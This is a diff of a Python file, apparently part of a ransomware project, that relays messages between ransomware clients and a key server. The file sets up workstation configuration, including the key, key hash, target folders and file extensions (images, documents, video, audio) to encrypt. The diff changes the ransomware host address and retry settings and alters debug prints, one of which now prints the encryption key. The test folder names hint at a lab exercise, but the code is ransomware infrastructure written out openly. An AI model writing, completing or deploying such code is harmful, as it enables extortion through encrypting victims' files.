@@ -11,13 +11,13 @@ import utile.security as security
 # Constantes
 IP_SERV_CLES = network.LOCAL_IP
 PORT_SERV_CLES = 8381
-CONN_RETRY_SERV_CLES = 60
-IP_RANSOMWARE = "192.168.146.165"
+CONN_RETRY_SERV_CLES = 20
+IP_RANSOMWARE = "0.0.0.0"
 PORT_RANSOMWARE = 8443
 CONFIG_SERVEUR = {}
 CONFIG_WORKSTATION = {
     'HASH': None,
-    'KEY': None,  # Clé à récupérer du serveur de clés
+    'KEY': None,
     'DISKS': None,
     'PATHS': ['tests_1', 'tests_2'],
     'FILE_EXT': ['.jpg', '.png', '.txt', '.avi', '.mp4', '.mp3', '.pdf'],
@@ -65,14 +65,11 @@ def handle_ransomware():
 
 def handle_client(socket_client):
     while True:
-        print("Hello1")
         message_ransomware = network.receive_message(socket_client)
-        print("Hello2")
         print("Message reçu : ", message_ransomware)
         if message_ransomware is not None:
             ransomware_queue.put((message_ransomware, socket_client))
         else:
-            print("Message ransomware reçu est None. Ignoré.")
             break
         while serv_cles_queue.empty():
             pass
@@ -80,11 +77,15 @@ def handle_client(socket_client):
             while not serv_cles_queue.empty():
                 message_to_ransomware = serv_cles_queue.get()
                 CONFIG_WORKSTATION['KEY'] = message_to_ransomware['KEY']
+                print(CONFIG_WORKSTATION['KEY'])
+
                 CONFIG_WORKSTATION['HASH'] = message_to_ransomware['KEY_RESP']
-                print(CONFIG_WORKSTATION)
+                print(CONFIG_WORKSTATION['HASH'])
+
+                # Passer CONFIG_WORKSTATION en argument à set_message
                 message_for_ransomware = message.set_message("CONFIGURE", CONFIG_WORKSTATION)
                 network.send_message(socket_client, message_for_ransomware)
-                print("Message envoyé : ", message_to_ransomware)
+                print("Message envoyé : ", message_for_ransomware)
 
 
 def main():
